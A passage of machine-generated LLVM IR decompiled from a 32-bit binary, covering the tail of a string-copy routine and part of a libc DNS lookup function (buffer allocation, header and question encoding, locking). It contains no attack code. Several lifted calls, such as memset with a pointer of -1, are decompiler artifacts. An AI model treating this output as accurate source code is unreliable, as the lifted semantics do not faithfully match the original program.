  %v4_8065b96 = add i32 %v3_8065b76, %v4_8065b76
  store i32 %v4_8065b96, i32* %ebp.global-to-local, align 4
  %v1_8065b99 = mul nuw nsw i32 %v5_8065bfe36, 256
  %v2_8065b9c = and i32 %v1_8065b99, 16128
  %v2_8065ba4 = or i32 %v5_8065b92, %v2_8065b9c
  store i32 %v2_8065ba4, i32* @edx, align 4
  store i32 %v1_8065bc5.ph48, i32* @ecx, align 4
  %v2_8065bfe = add i32 %v2_8065ba4, %arg1
  %v3_8065bfe = inttoptr i32 %v2_8065bfe to i8*
  %v4_8065bfe = load i8, i8* %v3_8065bfe, align 1
  %v1_8065c02 = icmp eq i8 %v4_8065bfe, 0
  %v1_8065c04 = icmp eq i1 %v1_8065c02, false
  br i1 %v1_8065c04, label %dec_label_pc_8065b6c, label %dec_label_pc_8065c0a.thread

dec_label_pc_8065c0a.thread:                      ; preds = %dec_label_pc_8065b85
  br label %bb

dec_label_pc_8065ba8:                             ; preds = %dec_label_pc_8065b6c
  %v2_8065ba8 = add i32 %v5_8065bfe36, %v1_8065bc5.ph48
  %v1_8065bad = add i32 %v2_8065ba8, 1
  store i32 %v1_8065bad, i32* @edi, align 4
  %v10_8065bae = icmp ult i32 %v1_8065bad, %arg4
  %v1_8065bb6 = icmp eq i1 %v10_8065bae, false
  br i1 %v1_8065bb6, label %dec_label_pc_8065c16, label %dec_label_pc_8065bb8

dec_label_pc_8065bb8:                             ; preds = %dec_label_pc_8065ba8
  %v2_8065bbe = add i32 %v1_8065b73, %arg1
  %v2_8065bc5 = add i32 %v1_8065bc5.ph48, %arg3
  %v3_8065bc8 = inttoptr i32 %v2_8065bc5 to i16*
  %v4_8065bc8 = call i32 @memcpy(i16* %v3_8065bc8, i32 %v2_8065bbe, i32 %v5_8065bfe36)
  %v0_8065bd4 = load i32, i32* %ebp.global-to-local, align 4
  %v0_8065bdd = load i32, i32* @esi, align 4
  %v2_8065bdd = add i32 %v0_8065bdd, %v5_8065bfe36
  store i32 %v2_8065bdd, i32* @edx, align 4
  %v1_8065be4 = icmp eq i1 %v8_8065b6c37, false
  %v2_8065bd4 = select i1 %v1_8065be4, i32 %v5_8065bfe36, i32 0
  %v4_8065be4 = add i32 %v0_8065bd4, %v2_8065bd4
  store i32 %v4_8065be4, i32* %ebp.global-to-local, align 4
  %v4_8065bf5 = add i32 %v2_8065ba8, %arg3
  %v5_8065bf5 = inttoptr i32 %v4_8065bf5 to i8*
  store i8 46, i8* %v5_8065bf5, align 1
  %v0_8065bf8.pre = load i32, i32* @edi, align 4
  %v1_8065bfe.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8065bf8.pre, i32* @ecx, align 4
  %v2_8065bfe25 = add i32 %v1_8065bfe.pre.pre, %arg1
  %v3_8065bfe26 = inttoptr i32 %v2_8065bfe25 to i8*
  %v4_8065bfe27 = load i8, i8* %v3_8065bfe26, align 1
  %v1_8065c0229 = icmp eq i8 %v4_8065bfe27, 0
  %v1_8065c0430 = icmp eq i1 %v1_8065c0229, false
  %v8_8065b6c31 = icmp eq i8 %stack_var_-17.135, 0
  %v0_8065b76.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_8065c0430, label %dec_label_pc_8065b6c.lr.ph, label %dec_label_pc_8065c0a

dec_label_pc_8065b6c.lr.ph:                       ; preds = %dec_label_pc_8065bb8, %dec_label_pc_8065b5e
  %v0_8065b76.pre = phi i32 [ 0, %dec_label_pc_8065b5e ], [ %v0_8065b76.pre.pre, %dec_label_pc_8065bb8 ]
  %v8_8065b6c3151 = phi i1 [ false, %dec_label_pc_8065b5e ], [ %v8_8065b6c31, %dec_label_pc_8065bb8 ]
  %v5_8065bfe2850.in = phi i8 [ %v4_8065bfe2743, %dec_label_pc_8065b5e ], [ %v4_8065bfe27, %dec_label_pc_8065bb8 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_8065b5e ], [ %stack_var_-17.135, %dec_label_pc_8065bb8 ]
  %v1_8065bc5.ph48 = phi i32 [ 0, %dec_label_pc_8065b5e ], [ %v0_8065bf8.pre, %dec_label_pc_8065bb8 ]
  %v0_8065b73.ph47 = phi i32 [ %arg2, %dec_label_pc_8065b5e ], [ %v1_8065bfe.pre.pre, %dec_label_pc_8065bb8 ]
  br label %dec_label_pc_8065b6c

dec_label_pc_8065c0a:                             ; preds = %dec_label_pc_8065bb8
  br i1 %v8_8065b6c31, label %bb, label %bb67

bb:                                               ; preds = %dec_label_pc_8065c0a.thread, %dec_label_pc_8065c0a
  %v0_8065c0f64 = phi i32 [ %v4_8065b96, %dec_label_pc_8065c0a.thread ], [ %v0_8065b76.pre.pre, %dec_label_pc_8065c0a ]
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_8065c0a.thread65, %dec_label_pc_8065c0a, %bb
  %v0_8065c0f63 = phi i32 [ %v0_8065c0f64, %bb ], [ %v0_8065b76.pre.pre, %dec_label_pc_8065c0a ], [ 0, %dec_label_pc_8065c0a.thread65 ]
  %tmp68 = phi i32 [ 2, %bb ], [ 1, %dec_label_pc_8065c0a ], [ 1, %dec_label_pc_8065c0a.thread65 ]
  %v4_8065c11 = add i32 %tmp68, %v0_8065c0f63
  br label %dec_label_pc_8065c19

dec_label_pc_8065c16:                             ; preds = %dec_label_pc_8065ba8, %entry
  br label %dec_label_pc_8065c19

dec_label_pc_8065c19:                             ; preds = %bb67, %dec_label_pc_8065c16
  %storemerge = phi i32 [ %v4_8065c11, %bb67 ], [ -1, %dec_label_pc_8065c16 ]
  store i32 %v0_8065b4a, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8065bc5.ph48, { 2, 1, 0 }
  uselistorder i32 %v0_8065b76.pre.pre, { 1, 2, 0 }
  uselistorder i1 %v8_8065b6c31, { 1, 0 }
  uselistorder i8 %v4_8065bfe, { 1, 0 }
  uselistorder i32 %v2_8065ba4, { 0, 2, 1 }
  uselistorder i32 %v4_8065b96, { 0, 2, 1 }
  uselistorder i32 %v5_8065bfe36, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 46, { 3, 0, 2, 1 }
  uselistorder i1 true, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8065c19, { 1, 0 }
  uselistorder label %bb67, { 2, 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8065c3a = call i32 @malloc(i32 512)
  store i32 %v2_8065c3a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8065c3a, i32* @ebp, align 4
  %v2_8065c48 = call i32 @malloc(i32 1025)
  store i32 %v2_8065c48, i32* %eax.global-to-local, align 4
  %v12_8065c51 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8065c54 = icmp eq i32 %v2_8065c3a, 0
  br i1 %v1_8065c54, label %dec_label_pc_80662cd, label %dec_label_pc_8065c5c

dec_label_pc_8065c5c:                             ; preds = %entry
  %v1_8065c5c = icmp eq i32 %v2_8065c48, 0
  br i1 %v1_8065c5c, label %dec_label_pc_80662cd, label %dec_label_pc_8065c64

dec_label_pc_8065c64:                             ; preds = %dec_label_pc_8065c5c
  %v5_8065c64 = icmp eq i32 %arg2, 0
  br i1 %v5_8065c64, label %dec_label_pc_80662cd, label %dec_label_pc_8065c72

dec_label_pc_8065c72:                             ; preds = %dec_label_pc_8065c64
  %v4_8065c72 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8065c72, i32* %eax.global-to-local, align 4
  %v2_8065c79 = load i8, i8* %arg1, align 1
  %v3_8065c79 = icmp eq i8 %v2_8065c79, 0
  br i1 %v3_8065c79, label %dec_label_pc_80662cd, label %dec_label_pc_8065c82

dec_label_pc_8065c82:                             ; preds = %dec_label_pc_8065c72
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8065c86 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8065c86, i32* %eax.global-to-local, align 4
  store i32 %v4_8065c72, i32* %edx.global-to-local, align 4
  %v2_8065ca9 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8065ca9, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v6_8065cb1 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 134586897, i32 ptrtoint (i8** @global_var_807da1c.842 to i32))
  store i32 %v6_8065cb1, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_807da1c.842 to i8*), i8** %stack_var_-252, align 4
  %v2_8065cbd = call i32 @pthread_mutex_lock(i32 ptrtoint (i8** @global_var_807da1c.842 to i32))
  %v0_8065cc2 = load i64, i64* @global_var_807da34.843, align 8
  %v1_8065cc2 = trunc i64 %v0_8065cc2 to i32
  %v1_8065cc7 = ashr i32 %v1_8065cc2, 31
  %v6_8065cc8 = and i64 %v0_8065cc2, 4294967295
  %v8_8065cc8 = zext i32 %v1_8065cc7 to i64
  %v9_8065cc8 = mul nuw i64 %v8_8065cc8, 4294967296
  %v10_8065cc8 = or i64 %v9_8065cc8, %v6_8065cc8
  %v14_8065cc8 = srem i64 %v10_8065cc8, %tmp33
  %v15_8065cc8 = trunc i64 %v14_8065cc8 to i32
  %v0_8065ccf = load i16, i16* @global_var_8075008.844, align 8
  %v2_8065cde = load i8*, i8** %stack_var_-252, align 4
  %v3_8065cde = ptrtoint i8* %v2_8065cde to i32
  store i32 %v3_8065cde, i32* %eax.global-to-local, align 4
  store i32 134586897, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v4_8065ce3 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-52, i32 1)
  store i32 %v4_8065ce3, i32* %eax.global-to-local, align 4
  %v3_8065e8a = inttoptr i32 %v15_8065cc8 to i8*
  %v1_80662a885 = add i32 %v12_8065c51, 28
  %v2_80662a886 = inttoptr i32 %v1_80662a885 to i32*
  %v3_80662a887 = load i32, i32* %v2_80662a886, align 4
  %tmp = icmp ult i32 %v3_80662a887, 3
  br i1 %tmp, label %dec_label_pc_8065d08, label %dec_label_pc_80662cd

dec_label_pc_8065d08:                             ; preds = %dec_label_pc_8065c82, %dec_label_pc_80662a8.backedge
  %v0_8065d0f93 = phi i32 [ %v0_80662a8.pre, %dec_label_pc_80662a8.backedge ], [ %v12_8065c51, %dec_label_pc_8065c82 ]
  %v1_8065d08 = add i32 %v0_8065d0f93, 20
  %v2_8065d08 = inttoptr i32 %v1_8065d08 to i32*
  %v3_8065d08 = load i32, i32* %v2_8065d08, align 4
  %v13_8065d08 = icmp eq i32 %v3_8065d08, -1
  br i1 %v13_8065d08, label %dec_label_pc_8065d08.dec_label_pc_8065d1e_crit_edge, label %dec_label_pc_8065d0f

dec_label_pc_8065d08.dec_label_pc_8065d1e_crit_edge: ; preds = %dec_label_pc_8065d08
  %v0_8065d1e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065d1e

dec_label_pc_8065d0f:                             ; preds = %dec_label_pc_8065d08
  %v3_8065d12 = load i32, i32* %v2_8065d08, align 4
  %v5_8065d12 = add i32 %v0_8065d0f93, -16
  %v6_8065d12 = inttoptr i32 %v5_8065d12 to i32*
  store i32 %v3_8065d12, i32* %v6_8065d12, align 4
  %v1_8065d16 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8065d16, i32* %eax.global-to-local, align 4
  %v0_8065d1b = load i32, i32* @esp, align 4
  %v1_8065d1b = add i32 %v0_8065d1b, 16
  br label %dec_label_pc_8065d1e

dec_label_pc_8065d1e:                             ; preds = %dec_label_pc_8065d08.dec_label_pc_8065d1e_crit_edge, %dec_label_pc_8065d0f
  %v1_8065d1e = phi i32 [ %v0_8065d0f93, %dec_label_pc_8065d08.dec_label_pc_8065d1e_crit_edge ], [ %v1_8065d1b, %dec_label_pc_8065d0f ]
  %v0_8065d1e = phi i32 [ %v0_8065d1e.pre, %dec_label_pc_8065d08.dec_label_pc_8065d1e_crit_edge ], [ %v1_8065d16, %dec_label_pc_8065d0f ]
  %v2_8065d1e = add i32 %v1_8065d1e, -4
  %v3_8065d1e = inttoptr i32 %v2_8065d1e to i32*
  store i32 %v0_8065d1e, i32* %v3_8065d1e, align 4
  %v1_8065d1f = add i32 %v1_8065d1e, -8
  %v2_8065d1f = inttoptr i32 %v1_8065d1f to i32*
  store i32 512, i32* %v2_8065d1f, align 4
  %v1_8065d24 = add i32 %v1_8065d1e, -12
  %v2_8065d24 = inttoptr i32 %v1_8065d24 to i32*
  store i32 0, i32* %v2_8065d24, align 4
  %v2_8065d26 = add i32 %v1_8065d1e, -16
  %v3_8065d26 = inttoptr i32 %v2_8065d26 to i32*
  store i32 %v2_8065c3a, i32* %v3_8065d26, align 4
  %v4_8065d27 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065d27, i32* %eax.global-to-local, align 4
  %v0_8065d2c = load i32, i32* @esp, align 4
  %v1_8065d2f = add i32 %v0_8065d2c, 8
  %v2_8065d2f = inttoptr i32 %v1_8065d2f to i32*
  store i32 48, i32* %v2_8065d2f, align 4
  %v1_8065d31 = add i32 %v0_8065d2c, 4
  %v2_8065d31 = inttoptr i32 %v1_8065d31 to i32*
  store i32 0, i32* %v2_8065d31, align 4
  %v1_8065d33 = add i32 %v0_8065d2c, 84
  store i32 %v1_8065d33, i32* @ebx, align 4
  %v3_8065d37 = inttoptr i32 %v0_8065d2c to i32*
  store i32 %v1_8065d33, i32* %v3_8065d37, align 4
  %v4_8065d38 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065d38, i32* %eax.global-to-local, align 4
  %v0_8065d3d = load i32, i32* @esp, align 4
  %v1_8065d3d = add i32 %v0_8065d3d, 72
  %v2_8065d3d = inttoptr i32 %v1_8065d3d to i32*
  %v3_8065d3d = load i32, i32* %v2_8065d3d, align 4
  store i32 %v3_8065d3d, i32* %eax.global-to-local, align 4
  %v1_8065d41 = add i32 %v0_8065d3d, 116
  %v2_8065d41 = inttoptr i32 %v1_8065d41 to i32*
  store i32 1, i32* %v2_8065d41, align 4
  %v0_8065d49 = load i32, i32* @esp, align 4
  %v1_8065d49 = add i32 %v0_8065d49, 104
  %v2_8065d49 = inttoptr i32 %v1_8065d49 to i32*
  store i32 1, i32* %v2_8065d49, align 4
  %v0_8065d51 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065d51 = add i32 %v0_8065d51, 1
  %v1_8065d52 = urem i32 %v1_8065d51, 65536
  store i32 %v1_8065d52, i32* %eax.global-to-local, align 4
  %v1_8065d57 = load i32, i32* @esp, align 4
  %v2_8065d57 = add i32 %v1_8065d57, 72
  %v3_8065d57 = inttoptr i32 %v2_8065d57 to i32*
  store i32 %v1_8065d52, i32* %v3_8065d57, align 4
  %v0_8065d5b = load i32, i32* %eax.global-to-local, align 4
  %v1_8065d5b = load i32, i32* @esp, align 4
  %v2_8065d5b = add i32 %v1_8065d5b, 84
  %v3_8065d5b = inttoptr i32 %v2_8065d5b to i32*
  store i32 %v0_8065d5b, i32* %v3_8065d5b, align 4
  %v0_8065d5f = load i32, i32* @esp, align 4
  %v1_8065d62 = add i32 %v0_8065d5f, 8
  %v2_8065d62 = inttoptr i32 %v1_8065d62 to i32*
  store i32 512, i32* %v2_8065d62, align 4
  %v2_8065d67 = add i32 %v0_8065d5f, 4
  %v3_8065d67 = inttoptr i32 %v2_8065d67 to i32*
  store i32 %v2_8065c3a, i32* %v3_8065d67, align 4
  %v0_8065d68 = load i32, i32* @ebx, align 4
  %v3_8065d68 = inttoptr i32 %v0_8065d5f to i32*
  store i32 %v0_8065d68, i32* %v3_8065d68, align 4
  %v0_8065d69 = call i32 @__encode_header()
  store i32 %v0_8065d69, i32* %eax.global-to-local, align 4
  %v0_8065d6e = load i32, i32* @esp, align 4
  %v2_8065d71 = icmp slt i32 %v0_8065d69, 0
  store i32 %v0_8065d69, i32* @ebx, align 4
  br i1 %v2_8065d71, label %dec_label_pc_80662cd, label %dec_label_pc_8065d7b

dec_label_pc_8065d7b:                             ; preds = %dec_label_pc_8065d1e
  %v2_8065d7b = add i32 %v0_8065d6e, 12
  %v3_8065d7b = inttoptr i32 %v2_8065d7b to i32*
  store i32 %v0_8065d69, i32* %v3_8065d7b, align 4
  %v1_8065d7c = add i32 %v0_8065d6e, 8
  %v2_8065d7c = inttoptr i32 %v1_8065d7c to i32*
  store i32 1025, i32* %v2_8065d7c, align 4
  %v1_8065d81 = add i32 %v0_8065d6e, 256
  %v2_8065d81 = inttoptr i32 %v1_8065d81 to i32*
  %v3_8065d81 = load i32, i32* %v2_8065d81, align 4
  %v5_8065d81 = add i32 %v0_8065d6e, 4
  %v6_8065d81 = inttoptr i32 %v5_8065d81 to i32*
  store i32 %v3_8065d81, i32* %v6_8065d81, align 4
  %v1_8065d88 = add i32 %v0_8065d6e, 28
  %v2_8065d88 = inttoptr i32 %v1_8065d88 to i32*
  %v3_8065d88 = load i32, i32* %v2_8065d88, align 4
  %v6_8065d88 = inttoptr i32 %v0_8065d6e to i32*
  store i32 %v3_8065d88, i32* %v6_8065d88, align 4
  %v4_8065d8c = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  %v0_8065d91 = load i32, i32* @esp, align 4
  %v1_8065d94 = add i32 %v0_8065d91, 8
  %v2_8065d94 = inttoptr i32 %v1_8065d94 to i32*
  store i32 ptrtoint (i32* @global_var_807500c.723 to i32), i32* %v2_8065d94, align 4
  %v1_8065d99 = add i32 %v0_8065d91, 4
  %v2_8065d99 = inttoptr i32 %v1_8065d99 to i32*
  store i32 134586897, i32* %v2_8065d99, align 4
  %v1_8065d9e = add i32 %v0_8065d91, 200
  store i32 %v1_8065d9e, i32* %eax.global-to-local, align 4
  %v3_8065da5 = inttoptr i32 %v0_8065d91 to i32*
  store i32 %v1_8065d9e, i32* %v3_8065da5, align 4
  %v4_8065da6 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065da6, i32* %eax.global-to-local, align 4
  %v0_8065dab = load i32, i32* @esp, align 4
  %v1_8065dab = inttoptr i32 %v0_8065dab to i32*
  store i32 ptrtoint (i32* @global_var_807500c.723 to i32), i32* %v1_8065dab, align 4
  %v1_8065db2 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8065db2, i32* %eax.global-to-local, align 4
  %v0_8065db7 = load i32, i32* @esp, align 4
  %v1_8065db7 = add i32 %v0_8065db7, 56
  %v2_8065db7 = inttoptr i32 %v1_8065db7 to i32*
  %v3_8065db7 = load i32, i32* %v2_8065db7, align 4
  store i32 %v3_8065db7, i32* %edx.global-to-local, align 4
  %v1_8065dbb = add i32 %v0_8065db7, 268
  %v2_8065dbb = inttoptr i32 %v1_8065dbb to i32*
  %v3_8065dbb = load i32, i32* %v2_8065dbb, align 4
  store i32 %v3_8065dbb, i32* %eax.global-to-local, align 4
  %v2_8065dc2 = mul i32 %v3_8065db7, 4
  %v3_8065dc2 = add i32 %v3_8065dbb, %v2_8065dc2
  %v4_8065dc2 = inttoptr i32 %v3_8065dc2 to i32*
  %v5_8065dc2 = load i32, i32* %v4_8065dc2, align 4
  store i32 %v5_8065dc2, i32* %edx.global-to-local, align 4
  %v2_8065dc5 = add i32 %v0_8065db7, 48
  %v3_8065dc5 = inttoptr i32 %v2_8065dc5 to i32*
  store i32 %v5_8065dc2, i32* %v3_8065dc5, align 4
  %v0_8065dc9 = load i32, i32* @esp, align 4
  %v1_8065dc9 = add i32 %v0_8065dc9, 16
  %v1_8065dcc = add i32 %v0_8065dc9, 52
  %v2_8065dcc = inttoptr i32 %v1_8065dcc to i32*
  %v3_8065dcc = load i32, i32* %v2_8065dcc, align 4
  %v5_8065dcc = icmp slt i32 %v3_8065dcc, 0
  br i1 %v5_8065dcc, label %dec_label_pc_8065d7b.dec_label_pc_8065e12_crit_edge, label %dec_label_pc_8065dd3

dec_label_pc_8065d7b.dec_label_pc_8065e12_crit_edge: ; preds = %dec_label_pc_8065d7b
  %v0_8065e12.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065e12

dec_label_pc_8065dd3:                             ; preds = %dec_label_pc_8065d7b
  store i32 %v3_8065dcc, i32* %eax.global-to-local, align 4
  %v1_8065dd7 = load i32, i32* @global_var_807f564.845, align 4
  %v2_8065dd7 = sub i32 %v3_8065dcc, %v1_8065dd7
  %v8_8065dd7 = xor i32 %v1_8065dd7, %v3_8065dcc
  %v9_8065dd7 = xor i32 %v2_8065dd7, %v3_8065dcc
  %v10_8065dd7 = and i32 %v9_8065dd7, %v8_8065dd7
  %v11_8065dd7 = icmp slt i32 %v10_8065dd7, 0
  %v13_8065dd7 = icmp slt i32 %v2_8065dd7, 0
  %v2_8065ddd = icmp eq i1 %v13_8065dd7, %v11_8065dd7
  br i1 %v2_8065ddd, label %dec_label_pc_8065e12, label %dec_label_pc_8065ddf

dec_label_pc_8065ddf:                             ; preds = %dec_label_pc_8065dd3
  %v2_8065ddf = add i32 %v0_8065dc9, 12
  %v3_8065ddf = inttoptr i32 %v2_8065ddf to i32*
  store i32 %v3_8065dcc, i32* %v3_8065ddf, align 4
  %v1_8065de0 = add i32 %v0_8065dc9, 8
  %v2_8065de0 = inttoptr i32 %v1_8065de0 to i32*
  store i32 1025, i32* %v2_8065de0, align 4
  %v1_8065de5 = add i32 %v0_8065dc9, 4
  %v2_8065de5 = inttoptr i32 %v1_8065de5 to i32*
  store i32 ptrtoint (i32* @global_var_806e926.846 to i32), i32* %v2_8065de5, align 4
  %v1_8065dea = add i32 %v0_8065dc9, 28
  %v2_8065dea = inttoptr i32 %v1_8065dea to i32*
  %v3_8065dea = load i32, i32* %v2_8065dea, align 4
  %v6_8065dea = inttoptr i32 %v0_8065dc9 to i32*
  store i32 %v3_8065dea, i32* %v6_8065dea, align 4
  %v0_8065dee = call i32 @__GI_strncat()
  store i32 %v0_8065dee, i32* %eax.global-to-local, align 4
  %v0_8065df3 = load i32, i32* @esp, align 4
  %v1_8065df6 = add i32 %v0_8065df3, 8
  %v2_8065df6 = inttoptr i32 %v1_8065df6 to i32*
  store i32 1025, i32* %v2_8065df6, align 4
  %v1_8065dfb = add i32 %v0_8065df3, 52
  %v2_8065dfb = inttoptr i32 %v1_8065dfb to i32*
  %v3_8065dfb = load i32, i32* %v2_8065dfb, align 4
  store i32 %v3_8065dfb, i32* %edx.global-to-local, align 4
  %v1_8065dff = mul i32 %v3_8065dfb, 4
  %v2_8065dff = add i32 %v1_8065dff, 134739268
  %v3_8065dff = inttoptr i32 %v2_8065dff to i32*
  %v4_8065dff = load i32, i32* %v3_8065dff, align 4
  %v6_8065dff = add i32 %v0_8065df3, 4
  %v7_8065dff = inttoptr i32 %v6_8065dff to i32*
  store i32 %v4_8065dff, i32* %v7_8065dff, align 4
  %v1_8065e06 = add i32 %v0_8065df3, 28
  %v2_8065e06 = inttoptr i32 %v1_8065e06 to i32*
  %v3_8065e06 = load i32, i32* %v2_8065e06, align 4
  %v6_8065e06 = inttoptr i32 %v0_8065df3 to i32*
  store i32 %v3_8065e06, i32* %v6_8065e06, align 4
  %v0_8065e0a = call i32 @__GI_strncat()
  store i32 %v0_8065e0a, i32* %eax.global-to-local, align 4
  %v0_8065e0f = load i32, i32* @esp, align 4
  %v1_8065e0f = add i32 %v0_8065e0f, 16
  br label %dec_label_pc_8065e12

dec_label_pc_8065e12:                             ; preds = %dec_label_pc_8065d7b.dec_label_pc_8065e12_crit_edge, %dec_label_pc_8065dd3, %dec_label_pc_8065ddf
  %v1_8065e12 = phi i32 [ %v1_8065dc9, %dec_label_pc_8065d7b.dec_label_pc_8065e12_crit_edge ], [ %v1_8065dc9, %dec_label_pc_8065dd3 ], [ %v1_8065e0f, %dec_label_pc_8065ddf ]
  %v0_8065e12 = phi i32 [ %v0_8065e12.pre, %dec_label_pc_8065d7b.dec_label_pc_8065e12_crit_edge ], [ %v3_8065dcc, %dec_label_pc_8065dd3 ], [ %v0_8065e0a, %dec_label_pc_8065ddf ]
  %v2_8065e12 = add i32 %v1_8065e12, -4
  %v3_8065e12 = inttoptr i32 %v2_8065e12 to i32*
  store i32 %v0_8065e12, i32* %v3_8065e12, align 4
  %v0_8065e13 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065e13 = add i32 %v1_8065e12, -8
  %v3_8065e13 = inttoptr i32 %v2_8065e13 to i32*
  store i32 %v0_8065e13, i32* %v3_8065e13, align 4
  %v1_8065e14 = add i32 %v1_8065e12, -12
  %v2_8065e14 = inttoptr i32 %v1_8065e14 to i32*
  store i32 1, i32* %v2_8065e14, align 4
  %v1_8065e16 = add i32 %v1_8065e12, 184
  store i32 %v1_8065e16, i32* %eax.global-to-local, align 4
  %v2_8065e1d = add i32 %v1_8065e12, -16
  %v3_8065e1d = inttoptr i32 %v2_8065e1d to i32*
  store i32 %v1_8065e16, i32* %v3_8065e1d, align 4
  %v3_8065e1e = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065cc8)
  store i32 %v3_8065e1e, i32* %eax.global-to-local, align 4
  %v0_8065e23 = load i32, i32* @esp, align 4
  %v1_8065e23 = add i32 %v0_8065e23, 28
  %v2_8065e23 = inttoptr i32 %v1_8065e23 to i32*
  %v3_8065e23 = load i32, i32* %v2_8065e23, align 4
  store i32 %v3_8065e23, i32* %eax.global-to-local, align 4
  %v1_8065e27 = add i32 %v0_8065e23, 260
  %v2_8065e27 = inttoptr i32 %v1_8065e27 to i32*
  %v3_8065e27 = load i32, i32* %v2_8065e27, align 4
  store i32 %v3_8065e27, i32* @edx, align 4
  %v1_8065e2e = add i32 %v0_8065e23, 224
  %v2_8065e2e = inttoptr i32 %v1_8065e2e to i32*
  store i32 1, i32* %v2_8065e2e, align 4
  %v0_8065e39 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065e39 = load i32, i32* @esp, align 4
  %v2_8065e39 = add i32 %v1_8065e39, 216
  %v3_8065e39 = inttoptr i32 %v2_8065e39 to i32*
  store i32 %v0_8065e39, i32* %v3_8065e39, align 4
  %v1_8065e45 = load i32, i32* @ebx, align 4
  %v2_8065e45 = sub i32 512, %v1_8065e45
  store i32 %v2_8065e45, i32* %eax.global-to-local, align 4
  %v0_8065e47 = load i32, i32* @edx, align 4
  %v1_8065e47 = load i32, i32* @esp, align 4
  %v2_8065e47 = add i32 %v1_8065e47, 220
  %v3_8065e47 = inttoptr i32 %v2_8065e47 to i32*
  store i32 %v0_8065e47, i32* %v3_8065e47, align 4
  %v0_8065e4e = load i32, i32* @esp, align 4
  %v0_8065e51 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065e51 = add i32 %v0_8065e4e, 8
  %v3_8065e51 = inttoptr i32 %v2_8065e51 to i32*
  store i32 %v0_8065e51, i32* %v3_8065e51, align 4
  %v1_8065e52 = load i32, i32* @ebx, align 4
  %v2_8065e52 = add i32 %v1_8065e52, %v2_8065c3a
  %v2_8065e56 = add i32 %v0_8065e4e, 4
  %v3_8065e56 = inttoptr i32 %v2_8065e56 to i32*
  store i32 %v2_8065e52, i32* %v3_8065e56, align 4
  %v1_8065e57 = add i32 %v0_8065e4e, 216
  store i32 %v1_8065e57, i32* @eax, align 4
  %v3_8065e5e = inttoptr i32 %v0_8065e4e to i32*
  store i32 %v1_8065e57, i32* %v3_8065e5e, align 4
  %v0_8065e5f = call i32 @__encode_question()
  store i32 %v0_8065e5f, i32* %eax.global-to-local, align 4
  %v0_8065e64 = load i32, i32* @esp, align 4
  %v2_8065e67 = icmp slt i32 %v0_8065e5f, 0
  store i32 %v0_8065e5f, i32* @esi, align 4
  br i1 %v2_8065e67, label %dec_label_pc_80662cd, label %dec_label_pc_8065e71

dec_label_pc_8065e71:                             ; preds = %dec_label_pc_8065e12
  %v1_8065e71 = add i32 %v0_8065e64, 172
  %v2_8065e71 = inttoptr i32 %v1_8065e71 to i16*
  store i16 2, i16* %v2_8065e71, align 2
  %v1_8065e7b = load i32, i32* @esp, align 4
  %v2_8065e7b = add i32 %v1_8065e7b, -4
  %v3_8065e7b = inttoptr i32 %v2_8065e7b to i32*
  store i32 %v0_8065e5f, i32* %v3_8065e7b, align 4
  %v1_8065e7c = add i32 %v1_8065e7b, 164
  store i32 %v1_8065e7c, i32* %eax.global-to-local, align 4
  %v2_8065e83 = add i32 %v1_8065e7b, -8
  %v3_8065e83 = inttoptr i32 %v2_8065e83 to i32*
  store i32 %v1_8065e7c, i32* %v3_8065e83, align 4
  %v1_8065e84 = add i32 %v1_8065e7b, 32
  %v2_8065e84 = inttoptr i32 %v1_8065e84 to i32*
  %v3_8065e84 = load i32, i32* %v2_8065e84, align 4
